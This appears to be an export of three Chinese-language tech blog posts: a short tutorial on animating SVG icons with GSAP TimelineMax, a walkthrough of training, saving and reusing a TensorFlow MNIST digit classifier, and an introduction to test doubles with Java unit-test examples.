    <title>十分鐘、五步驟，SVG 動起來！</title>
    <url>/2019/11/06/svg-animation-in-10mins/</url>
    <content><![CDATA[前言在 Codepen 上常常看到很多會設計又懂寫前端的高手，用 SVG 畫出很漂亮的圖案後，還能讓他們產生可愛的動畫，我一直很好奇他們是怎麼實作的，總覺得很困難，好像得對 SVG 透徹了解，並且自己畫出那些 SVG 圖案，才有辦法實作動畫。但其實不然，今天就來分享一個簡單的小技巧，讓你在短短十分鐘內就能讓一個靜態的 SVG 圖案活躍起來！
簡單看個成品，你可以點選下面範例中的 build 按鈕，可以看到原本靜止的 SVG 房子動了起來！

  See the Pen 
  SVG Animation House by Arvin (@arvin0731)
  on CodePen.



第一步，先找到你喜歡的 SVG 圖案如果你跟我一樣，畫不出漂亮的圖案或 Icon，可以到 Flaticon、Iconfinder 或 icons8 等網站找些免費的 svg icon 下載使用（注意授權即可）。

前陣子到美國出差發現他們好像很流行滑板車（scooter），那就到 Flaticon 上找個類似的圖案來玩玩！（一開始的房屋範例也是從 Flaticon 取得的）：


Icons made by Freepik from www.flaticon.com

第二步，分析一下你的 SVG 長什麼樣子找到喜歡的 svg icon 後，用瀏覽器打開，接著開啟 devtool，你會看到下面的結果：

裡面的 path 跟 circle 都是 svg 的 DOM 元件，跟字面上意思一樣，就是 svg 圖案內的線條與圓形。
svg 的 path，基本上就是一連串的 svg mini language：
&lt;path d=&quot;M 10 25         L 10 75         L 60 75         L 10 25&quot;&gt;

上面程式碼中的 d 的內容：M 代表將 筆 移動到 (10, 25)，接著 L 畫一條線到 (10, 75)，以此類推。詳細介紹可看這裡 - SVG Paths and D3.js。
透過 devtool，我們可以知道每個 path 是對應到畫面上的哪個部分：

到這邊大概就會有個方向了，既然我們可以知道每個元件對應到圖案上的哪個部分，我們就能夠針對想要套上動畫的 DOM 元件來操作！
第三步，好用的動畫工具 - TimelineLite &amp; TweenMax當然你可以給予每個 svg 內的 DOM 元件一個獨特的 id，或是 class name，然後用 CSS 或 JavaScript 來自行處理動畫，但這樣難度還是頗高，更重要的是，就沒辦法在十分鐘內做完 XD
所以我們得借用工具，Timeline(Lite|Max) 跟 TweenMax 是知名的 GreenSock Animation Platform（簡稱 GSAP）推出的套件，從名稱就可以猜出，主要是提供 時間軸 與 補間 動畫的 API：
&lt;!-- index.html --&gt;&lt;div class=&quot;example&quot;&gt;  &lt;div class=&quot;example__ball&quot;&gt;&lt;/div&gt;  &lt;h1 class=&quot;example__title&quot;&gt;Taiwan No.1!&lt;/h1&gt;    &lt;button onclick=&quot;animateCircle()&quot;&gt; Build! &lt;/button&gt;&lt;/div&gt;&lt;!-- JavaScript --&gt;&lt;script&gt;// 使用 TimelineMax 物件const tl = new TimelineMax();// 利用 .set 設定擁有 class name .example__title 的元素// 將其 scale 縮小成 0.2，透明度設為 0tl  .set(&quot;.example__title&quot;, &#123;    scale: 0.2,    autoAlpha: 0  &#125;)  // 將擁有 class name .example__ball 的元素  // scale 縮小成 0.2  .set(&quot;.example__ball&quot;, &#123;    scale: 0.2  &#125;)  // tween 1: 在 1 秒內旋轉 360 度，並翻轉 180 度  // 接著回復 scale 成原始大小，中間以 Elastic.easeIn 這個 ease function 來控制動畫速度  .to(&quot;.example__ball&quot;, 1, &#123;    rotationX: 360,    rotationY: 180,    scale: 1,    ease: Elastic.easeIn.config(2, 1)  &#125;)  // tween 2: 跟第一個補間動畫雷同，只是這次是控制文字，並在 0.5 內完成  .to(&quot;.example__title&quot;, 0.5, &#123;    autoAlpha: 1,    scale: 1,    ease: Back.easeOut.config(4)  &#125;);&lt;/script&gt;

GSAP 甚至提供一個 Ease Visualizer 讓你可以看看每種 Ease function 的效果，更順帶附上程式碼：

上述短短的程式碼就能達到如下效果：

  See the Pen 
  GSAP Tutorial: Simple Timeline by Arvin (@arvin0731)
  on CodePen.



第四步，結合 GSAP 工具與你喜愛的 SVGGSAP 的 API 文件蠻齊全的，還有論壇可以搜尋相關問題，使用上有任何問題幾乎都能在上面找到答案：官網文件、論壇
在一開始的房屋範例中，我主要使用的是 TimelineMax 的 from 與 staggerFrom，跟前步驟內的範例不同，這兩個 API 只需要設定初始值，他會在指定時間內將補間動畫完成：
tl.from(&#x27;#House &gt; rect:nth-child(24)&#x27;, 1, &#123;scaleX: 0, transformOrigin: &quot;center&quot;, ease: Power2.easeOut&#125;)

將 CSS Selector #House &gt; rect:nth-child(24) 這個元素，從 scaleX 為 0 開始，以 center(中心) 為變形起點，利用 Power2.easeOut 的 ease function，在一秒內回復到原始狀態，並執行補間動畫。
.staggerFrom([&#x27;#House &gt; path:nth-child(34)&#x27;, &#x27;#House &gt; path:nth-child(32)&#x27;], 0.8, &#123;scaleY: 0, transformOrigin: &quot;bottom&quot;, ease: Bounce.easeOut, stagger:0.2&#125;, 0, &quot;scene1+=0.5&quot;)

與 from 雷同，只是 staggerFrom 可以一次放入多個 CSS Selector，用 stagger 這個屬性來設定陣列中的 Selector 要以怎樣的時間差出現。
詳細 API 參數可以參考官方文件
接著回到我們的 SVG，在 devtool 的幫助下，要取出 svg 內部元素的 CSS Selector 非常容易，在 DOM 元件上按右鍵，選擇 Copy -&gt; Copy selector，就能直接複製到該元件的 CSS Selector：

現在我們能取得 svg 中任何部分的 CSS Selector，也知道我們能用 GSAP API 來進行補間動畫，現在是時候將其結合起來！
第一步先調整一下基本 Layout，一般在空白 Html 內直接放入 svg 時，圖案大多會緊靠頁面左上角，因為 svg 本身通常不會有任何關於 layout 的 CSS，所以可以套用個 margin: 0 auto 將其置中，看起來會順眼一些，你也能額外加些 padding。此外，為了方便測試動畫效果，也可以放個 button 在頁面上，用來呼叫你的動畫函式：
&lt;!--html part--&gt;&lt;button onclick=&quot;animateBike()&quot;&gt; Build! &lt;/button&gt;&lt;!--css part--&gt;&lt;style&gt;#Capa_1 &#123;  margin: 0 auto;  display: block;  width: 256px;  height: 100%;&#125;&lt;/style&gt;

接著我們使用 TimelineMax 提供的 staggerFrom 函式，利用 devtool 將滑板車的輪子部分找出來，複製它們的 CSS Selector，放入 staggerFrom 函式參數中，設定 x 與 y 軸的 scale 都從 0 開始，由 center 增長，採用 Bounce.easeOut 的 ease function，而四個 Selector 間以 stagger: 0.2 的屬性值作為補間動畫出現的時間差：
const tl = new TimelineMax();  tl    .staggerFrom([&#x27;#Capa_1 &gt; g &gt; path:nth-child(1)&#x27;, &#x27;#Capa_1 &gt; circle:nth-child(7)&#x27;, &#x27;#Capa_1 &gt; path:nth-child(6)&#x27;, &#x27;#Capa_1 &gt; circle:nth-child(5)&#x27;],      1, &#123;scaleY:0, scaleX: 0, transformOrigin: &quot;center&quot;, ease: Bounce.easeOut, stagger:0.2&#125;)

簡單幾行程式碼，就能讓我們的滑板車有了動畫！

  See the Pen 
  Scooter - demo1 by Arvin (@arvin0731)
  on CodePen.



第五步，發揮創意，將整體動畫完成TimelineMax 所提供的 API 都是 chainable 的，你可以想像成是時間軸一般，動畫跟著 chain 一步一步照順序執行，而 staggerFrom 則可以同時讓多個 DOM 元件以些微時間差的順序啟動，另外也能設置一些 Flag 來指定要等到哪幾個動畫完成後，才接續其他動畫，這些細節當你在思考要如何“動畫”你的 SVG 時，再去 GSAP 的文件與論壇查詢，相信都能找到解答。
最後，發揮自己的創意，把 svg 的各個部分都補上動畫，搭配 GSAP 提供的文件，組合各種 API，一個簡單的作品就完成了：

  See the Pen 
  Scooter - final-steps by Arvin (@arvin0731)
  on CodePen.



結論雖然這個小技巧說破真的不值錢，最困難的技術都交給了 GSAP 處理，SVG 還不用是自己畫的，但加在自己的部落格或是放在投影片中，可以瞬間讓畫面更加豐富，無聊沒事拿來娛樂自己也是很不錯的選擇，像是出國旅行回來有時差睡不著，不如就來畫個動畫調養身心 XD總之，我自己覺得蠻有趣的，希望或多或少對讀到這篇文章的人有點幫助。
資料來源
GreenSock Animation Platform
How to Create Beautiful SVG Animations Easily

關於作者：@arvinh 前端攻城獅，熱愛數據分析和資訊視覺化
]]></content>
      <tags>
        <tag>web</tag>
        <tag>animation</tag>
        <tag>svg</tag>
        <tag>TimelineMax</tag>
        <tag>GSAP</tag>
      </tags>
  </entry>
  <entry>
    <title>使用 TensorFlow 來做簡單的手寫數字辨識</title>
    <url>/2018/01/27/tensorflow-mnist/</url>
    <content><![CDATA[前言相信大家都知道 TensorFlow 是可以用來建立跟訓練機器學習的模型，今天我們就來跑一個最簡單的 Neural Network，來辨識手寫數字，讓他吐出結果。有了這個程式之後，之後就可以再銜接其他的工具，例如讓機器人裝一個 camera，讀到 camera 的影像之後可以辨識數字，這樣就可以透過數字來對機器人下指令。或是可以再抽換辨識手寫數字的 node，改成辨識物體之類的。
接下來就讓我們開始吧。
TensorFlow 辨識手寫數字首先，我們可以直接參考現成的程式碼，裡面兜出了一個 2 層的 Fully Connected Neural Network（也稱作 Multilayer Perceptron），裡面原本就有滿清楚的註解，讓大家易於理解：
&quot;&quot;&quot; Neural Network.A 2-Hidden Layers Fully Connected Neural Network (a.k.a Multilayer Perceptron)implementation with TensorFlow. This example is using the MNIST databaseof handwritten digits (http://yann.lecun.com/exdb/mnist/).Links:    [MNIST Dataset](http://yann.lecun.com/exdb/mnist/).Author: Aymeric DamienProject: https://github.com/aymericdamien/TensorFlow-Examples/&quot;&quot;&quot; from __future__ import print_function # Import MNIST datafrom tensorflow.examples.tutorials.mnist import input_datamnist = input_data.read_data_sets(&quot;/tmp/data/&quot;, one_hot=True) import tensorflow as tf # Parameterslearning_rate = 0.1num_steps = 500batch_size = 128display_step = 100 # Network Parametersn_hidden_1 = 256 # 1st layer number of neuronsn_hidden_2 = 256 # 2nd layer number of neuronsnum_input = 784 # MNIST data input (img shape: 28*28)num_classes = 10 # MNIST total classes (0-9 digits) # tf Graph input# placeX = tf.placeholder(&quot;float&quot;, [None, num_input])Y = tf.placeholder(&quot;float&quot;, [None, num_classes]) # Store layers weight &amp; biasweights = &#123;    &#x27;h1&#x27;: tf.Variable(tf.random_normal([num_input, n_hidden_1])),    &#x27;h2&#x27;: tf.Variable(tf.random_normal([n_hidden_1, n_hidden_2])),    &#x27;out&#x27;: tf.Variable(tf.random_normal([n_hidden_2, num_classes]))&#125;biases = &#123;    &#x27;b1&#x27;: tf.Variable(tf.random_normal([n_hidden_1])),    &#x27;b2&#x27;: tf.Variable(tf.random_normal([n_hidden_2])),    &#x27;out&#x27;: tf.Variable(tf.random_normal([num_classes]))&#125;  # Create modeldef neural_net(x):    # Hidden fully connected layer with 256 neurons    layer_1 = tf.add(tf.matmul(x, weights[&#x27;h1&#x27;]), biases[&#x27;b1&#x27;])    # Hidden fully connected layer with 256 neurons    layer_2 = tf.add(tf.matmul(layer_1, weights[&#x27;h2&#x27;]), biases[&#x27;b2&#x27;])    # Output fully connected layer with a neuron for each class    out_layer = tf.matmul(layer_2, weights[&#x27;out&#x27;]) + biases[&#x27;out&#x27;]    return out_layer # Construct modellogits = neural_net(X)prediction = tf.nn.softmax(logits) # Define loss and optimizerloss_op = tf.reduce_mean(tf.nn.softmax_cross_entropy_with_logits(    logits=logits, labels=Y))optimizer = tf.train.AdamOptimizer(learning_rate=learning_rate)train_op = optimizer.minimize(loss_op) # Evaluate modelcorrect_pred = tf.equal(tf.argmax(prediction, 1), tf.argmax(Y, 1))accuracy = tf.reduce_mean(tf.cast(correct_pred, tf.float32)) # Initialize the variables (i.e. assign their default value)init = tf.global_variables_initializer() # Start trainingwith tf.Session() as sess:     # Run the initializer    sess.run(init)     for step in range(1, num_steps+1):        batch_x, batch_y = mnist.train.next_batch(batch_size)        # Run optimization op (backprop)        sess.run(train_op, feed_dict=&#123;X: batch_x, Y: batch_y&#125;)        if step % display_step == 0 or step == 1:            # Calculate batch loss and accuracy            loss, acc = sess.run([loss_op, accuracy], feed_dict=&#123;X: batch_x,                                                                 Y: batch_y&#125;)            print(&quot;Step &quot; + str(step) + &quot;, Minibatch Loss= &quot; + \                  &quot;&#123;:.4f&#125;&quot;.format(loss) + &quot;, Training Accuracy= &quot; + \                  &quot;&#123;:.3f&#125;&quot;.format(acc))     print(&quot;Optimization Finished!&quot;)     # Calculate accuracy for MNIST test images    print(&quot;Testing Accuracy:&quot;, \        sess.run(accuracy, feed_dict=&#123;X: mnist.test.images,                                      Y: mnist.test.labels&#125;))

執行這個程式之後，你應該會看到以下的結果，表示功能正常，可以拿來辨識手寫數字的 dataset：
ros@ros-K401UB:~/code/standalone/tensorflow$ python3.4 simple_nn.py Successfully downloaded train-images-idx3-ubyte.gz 9912422 bytes.Extracting /tmp/data/train-images-idx3-ubyte.gzSuccessfully downloaded train-labels-idx1-ubyte.gz 28881 bytes.Extracting /tmp/data/train-labels-idx1-ubyte.gzSuccessfully downloaded t10k-images-idx3-ubyte.gz 1648877 bytes.Extracting /tmp/data/t10k-images-idx3-ubyte.gzSuccessfully downloaded t10k-labels-idx1-ubyte.gz 4542 bytes.Extracting /tmp/data/t10k-labels-idx1-ubyte.gz2018-01-27 13:10:45.868367: I tensorflow/core/platform/cpu_feature_guard.cc:137] Your CPU supports instructions that this TensorFlow binary was not compiled to use: SSE4.1 SSE4.2 AVX AVX2 FMAStep 1, Minibatch Loss= 12711.9502, Training Accuracy= 0.305Step 100, Minibatch Loss= 473.9966, Training Accuracy= 0.852Step 200, Minibatch Loss= 67.3683, Training Accuracy= 0.938Step 300, Minibatch Loss= 102.2178, Training Accuracy= 0.883Step 400, Minibatch Loss= 43.7579, Training Accuracy= 0.914Step 500, Minibatch Loss= 49.5792, Training Accuracy= 0.820Optimization Finished!Testing Accuracy: 0.8672

但是，上面這個範例跑起來有點空虛，因為只是跑了一個 dataset，但我們是希望用來辨識一張圖片。
儲存可以辨識手寫數字的 Model雖然要訓練這個範例很簡單，但我們不希望每次啟動程式時都重新訓練一次，所以我們希望可以將訓練完的 model 儲存下來，我們主要可以參考這個範例程式碼，然後把儲存 model 需要用到的幾個函式放到我們上面的範例中：
&quot;&quot;&quot; Neural Network.A 2-Hidden Layers Fully Connected Neural Network (a.k.a Multilayer Perceptron)implementation with TensorFlow. This example is using the MNIST databaseof handwritten digits (http://yann.lecun.com/exdb/mnist/).Links:    [MNIST Dataset](http://yann.lecun.com/exdb/mnist/).Author: Aymeric DamienProject: https://github.com/aymericdamien/TensorFlow-Examples/&quot;&quot;&quot; from __future__ import print_function # Import MNIST datafrom tensorflow.examples.tutorials.mnist import input_datamnist = input_data.read_data_sets(&quot;/tmp/data/&quot;, one_hot=True) import tensorflow as tf # Parameterslearning_rate = 0.1num_steps = 500batch_size = 128display_step = 100model_path = &quot;/tmp/model.ckpt&quot; # Network Parametersn_hidden_1 = 256 # 1st layer number of neuronsn_hidden_2 = 256 # 2nd layer number of neuronsnum_input = 784 # MNIST data input (img shape: 28*28)num_classes = 10 # MNIST total classes (0-9 digits) # tf Graph inputX = tf.placeholder(&quot;float&quot;, [None, num_input])Y = tf.placeholder(&quot;float&quot;, [None, num_classes]) # Store layers weight &amp; biasweights = &#123;    &#x27;h1&#x27;: tf.Variable(tf.random_normal([num_input, n_hidden_1])),    &#x27;h2&#x27;: tf.Variable(tf.random_normal([n_hidden_1, n_hidden_2])),    &#x27;out&#x27;: tf.Variable(tf.random_normal([n_hidden_2, num_classes]))&#125;biases = &#123;    &#x27;b1&#x27;: tf.Variable(tf.random_normal([n_hidden_1])),    &#x27;b2&#x27;: tf.Variable(tf.random_normal([n_hidden_2])),    &#x27;out&#x27;: tf.Variable(tf.random_normal([num_classes]))&#125;  # Create modeldef neural_net(x):    # Hidden fully connected layer with 256 neurons    layer_1 = tf.add(tf.matmul(x, weights[&#x27;h1&#x27;]), biases[&#x27;b1&#x27;])    # Hidden fully connected layer with 256 neurons    layer_2 = tf.add(tf.matmul(layer_1, weights[&#x27;h2&#x27;]), biases[&#x27;b2&#x27;])    # Output fully connected layer with a neuron for each class    out_layer = tf.matmul(layer_2, weights[&#x27;out&#x27;]) + biases[&#x27;out&#x27;]    return out_layer # Construct modellogits = neural_net(X)prediction = tf.nn.softmax(logits) # Define loss and optimizerloss_op = tf.reduce_mean(tf.nn.softmax_cross_entropy_with_logits(    logits=logits, labels=Y))optimizer = tf.train.AdamOptimizer(learning_rate=learning_rate)train_op = optimizer.minimize(loss_op) # Evaluate modelcorrect_pred = tf.equal(tf.argmax(prediction, 1), tf.argmax(Y, 1))accuracy = tf.reduce_mean(tf.cast(correct_pred, tf.float32)) # Initialize the variables (i.e. assign their default value)init = tf.global_variables_initializer() # &#x27;Saver&#x27; op to save and restore all the variablessaver = tf.train.Saver() # Start trainingwith tf.Session() as sess:     # Run the initializer    sess.run(init)     for step in range(1, num_steps+1):        batch_x, batch_y = mnist.train.next_batch(batch_size)        # Run optimization op (backprop)        sess.run(train_op, feed_dict=&#123;X: batch_x, Y: batch_y&#125;)        if step % display_step == 0 or step == 1:            # Calculate batch loss and accuracy            loss, acc = sess.run([loss_op, accuracy], feed_dict=&#123;X: batch_x,                                                                  Y: batch_y&#125;)            print(&quot;Step &quot; + str(step) + &quot;, Minibatch Loss= &quot; + \                  &quot;&#123;:.4f&#125;&quot;.format(loss) + &quot;, Training Accuracy= &quot; + \                  &quot;&#123;:.3f&#125;&quot;.format(acc))     print(&quot;Optimization Finished!&quot;)     # Save model weights to disk    save_path = saver.save(sess, model_path)    print(&quot;Model saved in file: %s&quot; % save_path) # Running a test dataset by loading the model saved earlierwith tf.Session() as sess:      # Run the initializer    sess.run(init)     saver.restore(sess, model_path)    print(&quot;Model restored from file: %s&quot; % save_path)         # Calculate accuracy for MNIST test images    print(&quot;Testing Accuracy:&quot;, \    sess.run(accuracy, feed_dict=&#123;X: mnist.test.images,                                      Y: mnist.test.labels&#125;))

把這個程式跑起來之後，你應該可以看到以下的輸出：
ros@ros-K401UB:~/code/standalone/tensorflow$ python3.4 simple_nn_store.py ^[[Z^[[ZExtracting /tmp/data/train-images-idx3-ubyte.gzExtracting /tmp/data/train-labels-idx1-ubyte.gzExtracting /tmp/data/t10k-images-idx3-ubyte.gzExtracting /tmp/data/t10k-labels-idx1-ubyte.gz2018-01-27 16:56:13.000020: I tensorflow/core/platform/cpu_feature_guard.cc:137] Your CPU supports instructions that this TensorFlow binary was not compiled to use: SSE4.1 SSE4.2 AVX AVX2 FMAStep 1, Minibatch Loss= 9857.0781, Training Accuracy= 0.320Step 100, Minibatch Loss= 320.8330, Training Accuracy= 0.859Step 200, Minibatch Loss= 121.9466, Training Accuracy= 0.805Step 300, Minibatch Loss= 55.0800, Training Accuracy= 0.891Step 400, Minibatch Loss= 89.7953, Training Accuracy= 0.828Step 500, Minibatch Loss= 52.5457, Training Accuracy= 0.836Optimization Finished!Model saved in file: /tmp/model.ckptModel restored from file: /tmp/model.ckptTesting Accuracy: 0.847

將辨識手寫數字的 Model 變成可以吃一張 28x28 的影像並輸出答案上面的兩步，我們已經把基本範例用起來，不過他還不太直覺，因為我們是希望讓手寫辨識的 node 可以吃進一張影像，然後吐出結果，所以在這一步我們要改寫一下。
一步一步來，首先我們可以將 training 的地方改成直接讀取 train 好的 model，然後把計算 accuracy 的地方改成直接輸出辨識的結果：
from __future__ import print_function import tensorflow as tf from tensorflow.examples.tutorials.mnist import input_datamnist = input_data.read_data_sets(&quot;/tmp/data/&quot;, one_hot=True) # Parametersmodel_path = &quot;/tmp/model.ckpt&quot; # Network Parametersn_hidden_1 = 256 # 1st layer number of neuronsn_hidden_2 = 256 # 2nd layer number of neuronsnum_input = 784 # MNIST data input (img shape: 28*28)num_classes = 10 # MNIST total classes (0-9 digits) # tf Graph inputX = tf.placeholder(&quot;float&quot;, [None, num_input]) # Store layers weight &amp; biasweights = &#123;    &#x27;h1&#x27;: tf.Variable(tf.random_normal([num_input, n_hidden_1])),    &#x27;h2&#x27;: tf.Variable(tf.random_normal([n_hidden_1, n_hidden_2])),    &#x27;out&#x27;: tf.Variable(tf.random_normal([n_hidden_2, num_classes]))&#125;biases = &#123;    &#x27;b1&#x27;: tf.Variable(tf.random_normal([n_hidden_1])),    &#x27;b2&#x27;: tf.Variable(tf.random_normal([n_hidden_2])),    &#x27;out&#x27;: tf.Variable(tf.random_normal([num_classes]))&#125; # Create modeldef neural_net(x):    # Hidden fully connected layer with 256 neurons    layer_1 = tf.add(tf.matmul(x, weights[&#x27;h1&#x27;]), biases[&#x27;b1&#x27;])    # Hidden fully connected layer with 256 neurons    layer_2 = tf.add(tf.matmul(layer_1, weights[&#x27;h2&#x27;]), biases[&#x27;b2&#x27;])    # Output fully connected layer with a neuron for each class    out_layer = tf.matmul(layer_2, weights[&#x27;out&#x27;]) + biases[&#x27;out&#x27;]    return out_layer # Construct modellogits = neural_net(X)prediction = tf.nn.softmax(logits) # Evaluate model# argmax returns the index with the largest value across axes of a tensorans = tf.argmax(prediction, 1) # Initialize the variables (i.e. assign their default value)init = tf.global_variables_initializer() # &#x27;Saver&#x27; op to save and restore all the variablessaver = tf.train.Saver() # Running a test dataset by loading the model saved earlierwith tf.Session() as sess:    # Run the initializer    sess.run(init)     saver.restore(sess, model_path)    print(&quot;Model restored from file: %s&quot; % model_path)     # Calculate accuracy for MNIST test images    print(&quot;Answer:&quot;, sess.run(ans, feed_dict=&#123;X: mnist.test.images&#125;))

跑出來之後，你應該會看到下列結果：
ros@ros-K401UB:~/code/standalone/tensorflow$ python3.4 simple_nn_srv.pyExtracting /tmp/data/train-images-idx3-ubyte.gzExtracting /tmp/data/train-labels-idx1-ubyte.gzExtracting /tmp/data/t10k-images-idx3-ubyte.gzExtracting /tmp/data/t10k-labels-idx1-ubyte.gz2018-01-27 20:06:24.861211: I tensorflow/core/platform/cpu_feature_guard.cc:137] Your CPU supports instructions that this TensorFlow binary was not compiled to use: SSE4.1 SSE4.2 AVX AVX2 FMAModel restored from file: /tmp/model.ckptAnswer: [7 2 1 ..., 4 5 6]

然後，我們可以將他改成只吃一張影像，並輸出這張影像的辨識結果：
&quot;&quot;&quot; Neural Network.A 2-Hidden Layers Fully Connected Neural Network (a.k.a Multilayer Perceptron)implementation with TensorFlow. This example is using the MNIST databaseof handwritten digits (http://yann.lecun.com/exdb/mnist/).Links:    [MNIST Dataset](http://yann.lecun.com/exdb/mnist/).Author: Aymeric DamienProject: https://github.com/aymericdamien/TensorFlow-Examples/&quot;&quot;&quot;from __future__ import print_functionimport tensorflow as tfimport matplotlib.pyplot as pltfrom tensorflow.examples.tutorials.mnist import input_datamnist = input_data.read_data_sets(&quot;/tmp/data/&quot;, one_hot=True)# Parametersmodel_path = &quot;/tmp/model.ckpt&quot; # Network Parametersn_hidden_1 = 256 # 1st layer number of neuronsn_hidden_2 = 256 # 2nd layer number of neuronsnum_input = 784 # MNIST data input (img shape: 28*28)num_classes = 10 # MNIST total classes (0-9 digits) # tf Graph inputX = tf.placeholder(&quot;float&quot;, [None, num_input]) # Store layers weight &amp; biasweights = &#123;    &#x27;h1&#x27;: tf.Variable(tf.random_normal([num_input, n_hidden_1])),    &#x27;h2&#x27;: tf.Variable(tf.random_normal([n_hidden_1, n_hidden_2])),    &#x27;out&#x27;: tf.Variable(tf.random_normal([n_hidden_2, num_classes]))&#125;biases = &#123;    &#x27;b1&#x27;: tf.Variable(tf.random_normal([n_hidden_1])),    &#x27;b2&#x27;: tf.Variable(tf.random_normal([n_hidden_2])),    &#x27;out&#x27;: tf.Variable(tf.random_normal([num_classes]))&#125; # Create modeldef neural_net(x):    # Hidden fully connected layer with 256 neurons    layer_1 = tf.add(tf.matmul(x, weights[&#x27;h1&#x27;]), biases[&#x27;b1&#x27;])    # Hidden fully connected layer with 256 neurons    layer_2 = tf.add(tf.matmul(layer_1, weights[&#x27;h2&#x27;]), biases[&#x27;b2&#x27;])    # Output fully connected layer with a neuron for each class    out_layer = tf.matmul(layer_2, weights[&#x27;out&#x27;]) + biases[&#x27;out&#x27;]    return out_layer # Construct modellogits = neural_net(X)prediction = tf.nn.softmax(logits) # Evaluate model# argmax returns the index with the largest value across axes of a tensorans = tf.argmax(prediction, 1) # Initialize the variables (i.e. assign their default value)init = tf.global_variables_initializer() # &#x27;Saver&#x27; op to save and restore all the variablessaver = tf.train.Saver() # Show image that we want to predictplt.imshow(mnist.test.images[0].reshape((28, 28)))plt.show()# Running a test dataset by loading the model saved earlierwith tf.Session() as sess:    # Run the initializer    sess.run(init)     saver.restore(sess, model_path)    print(&quot;Model restored from file: %s&quot; % model_path)     # Calculate the answer for the image    print(&quot;Answer:&quot;, sess.run(ans, feed_dict=&#123;X: mnist.test.images[0:1]&#125;))

跑起來之後，你應該會先看到這個圖片的輸出：

然後會看到下列的命令列輸出：
ros@ros-K401UB:~/code/standalone/tensorflow$ python3.4 simple_nn_srv.pyExtracting /tmp/data/train-images-idx3-ubyte.gzExtracting /tmp/data/train-labels-idx1-ubyte.gzExtracting /tmp/data/t10k-images-idx3-ubyte.gzExtracting /tmp/data/t10k-labels-idx1-ubyte.gz2018-01-27 23:08:35.638018: I tensorflow/core/platform/cpu_feature_guard.cc:137] Your CPU supports instructions that this TensorFlow binary was not compiled to use: SSE4.1 SSE4.2 AVX AVX2 FMAModel restored from file: /tmp/model.ckptAnswer: [7]

可以看到自己的 model 成功辨識數字了!
總結今天我們一起使用 TensorFlow 了一個可以辨識手寫數字的程式，其實這個範例可以用來做很多事情，例如你可以將辨識手寫數字的程式跟 ROS 串起來，變成可以辨識手寫數字的 node（只需要再串接 ROS），然後建立一個 service ，就可以讓其他人拿圖片來跟這個 node 要求辨識結果。或是將 node 裡面的功能和訊息格式修改一下，就可以做到物體辨識。之後有機會再一起來實作。
關於作者：@pojenlai 演算法工程師，對機器人跟電腦視覺有少許研究，最近在學習看清事物的本質與改進自己的觀念
]]></content>
      <tags>
        <tag>TensorFlow, Neural Network</tag>
      </tags>
  </entry>
  <entry>
    <title>測試替身(上篇)</title>
    <url>/2018/03/02/test-double-1/</url>
    <content><![CDATA[如果你在工作時寫過一些測試程式，也許你聽過什麼是 Mock，但其實 Mock 只是測試替身的其中一種，測試替身包含了 Dummy、Mock、Fake、Stub、Spy。而不同語言或不同 framework 有時候會把類似的概念合在一起。
本系列的目的是讓你寫單元測試的時候，對應不同情況，知道應該用哪一種替身。像筆者常用的 Mockito 基本上把大部份的測試替身都用 Mock 取代，雖然用起來容易，但我以前從來不知道自己用的是哪一種測試替身 。
希望看完本系列的文章後，讀者能夠在寫完一段程式碼之後，就立即能分析出自己這段程式碼需要用的是什麼替身來進行測試。

名詞解釋SUT: System Under Test。就是需要被測試的東西。
DOC: Depended On Component。就是SUT需要依賴的東西。
DOC 非常常見，幾乎無可避免。
比如說 SUT 是 web server。那 DOC 就是 database。
比如說 SUT 是 web fronted。那 DOC 就是 web server。
你不太可能每個函數都自己玩自己的，你通常都會需要呼叫別人的函式，但這其實對測試帶來了負擔。比如說你每次想測試你的 webserver 可不可以新增使用者的時候，你都需要真的去 database 叫他加一個給你。
這實在開銷太大，也非常不實際。
測試替身的目的1.第一個也是最重要的一個，是隔離你的 SUT，不被任何 DOC 干擾。
我不想要我測試新增使用者的時候，還要保證 database 是正常的。我任何時候都想跑測試，不依賴任何人。
2.加速執行時間，避免不必要開銷。
不依靠他人之後，所有你需要的 DOC 的回傳值都先定義好，當然加快了執行速度。
3.讓你的測試 Deterministic。
我不想要在不同時間或不同空間裡，會得到不一樣的測試結果。比如說，尖峰時刻 database load 太大，回傳了不預期的 Http status 429。這是我不想在我預期要是 happy case 的情況時看到的結果。
4.模擬特殊狀況(special case)
比無法測試 happy case 的情況還要慘的事情，是無法測試 bad case。
這點也很重要，如果真的遇到了不預期的狀況(比如剛剛說的 429)，最慘就是等一陣子，database 正常後，就可以過了。
但有時候我們就是想要知道，當真的回傳 429 的時候，我們處理的方法是不是正確。如果沒有 test doubles，根本無法保證這種狀況一定發生。也不可能去 DDOS 自己的 database 製造這種情況。
5.可以讓你測試到你不想公開的資訊
這點就厲害了。來個例子:
SUT 是 WebServer。 DOC 是 database
public class WebServer &#123;  private Database database;  public void create()&#123;    database.insert()  &#125;&#125;

比如說這樣，我想知道我 webser.create 的時候，database.insert的確被呼叫，要怎麼測試？我不想要開放一個 public function getDatabase 供大家存取 database 的狀態，僅僅只是為了測試用途。
該怎麼辦呢？這時候來一個漂亮的替身。
public class WebServerTest&#123;  @Test  public void databaseInsertedWhenServerCreate()&#123;    TestDatabase testDatabase = new TestDatabase();    WebServer webserver = WebServer(testDatabase);    webserver.create();    assertTrue(testDatabase.isInserted)  &#125;&#125;public class TestDatabase extends Database&#123;  private boolean isInserted  public void insert()&#123;    isInserted = true;  &#125;  public void isInsert()&#123;    return isInserted;  &#125;&#125;
注意:

TestDatabase 需要 extends Database，不然丟不進 Webserver 的 constructor。

原本的 Database 這個 Class 沒有 isInsert 這個函式，是我自己加的。


搞定。prod 上的 Database 完全不用動，我就可以知道當 webserver.create 被呼叫的時候，我的的確確呼叫了 database.insert。
看完了為什麼需要測試替身之後，之後會一一介紹每個測試替身的使用時機跟用法。
Dummy首先登場的，就是最簡單的替身，也就是 Dummy。
當我們需要傳一個變數給某個 method 的時候，需要一個跟 signature 一樣型態的變數，可是這個變數以後又不會用到。為了加速跟省記憶體空間，我們可以丟一個 Dummy 替身給這個 method。
比如說，我們想要測試 People 的 getNumberOfPerson 這個函式。
public class People &#123;  private List&lt;Person&gt; persons;  public void addPerson(Person p)&#123;    persons.add(p);  &#125;  public int getNumberOfPerson()&#123;    return persons.size();  &#125;&#125;
那你的測試可能原本長成這樣:
public class PeopleTest&#123;  @Test  public void testGetNumberOfPerson()&#123;    People people = new People();    Person person1 = new Person(&quot;John Doe&quot;, 25, address1, phoneNumber1);    Person person2 = new Person(&quot;Jane Doe&quot;, 23, address2, phoneNumber2);    people.addPerson(person1);    people.addPerson(person2);    assertEquals(2, people.getNumberOfPerson())  &#125;&#125;
